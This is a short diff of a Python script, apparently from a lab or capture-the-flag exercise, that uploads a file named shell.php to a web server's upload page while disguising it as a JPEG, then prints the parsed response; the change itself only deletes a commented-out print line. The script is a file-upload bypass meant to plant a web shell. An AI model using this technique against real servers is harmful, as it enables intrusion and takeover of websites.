@@ -9,4 +9,3 @@ url = 'http://10.12.250.191/?page=upload'
 page = requests.post(url, files={'uploaded': ("shell.php", open("shell.php", "rb"), "image/jpeg")}, data={'Upload':'Upload'} )
 soup = BeautifulSoup(page.text, 'html.parser')
 print(soup.prettify())
-#print(page.text)
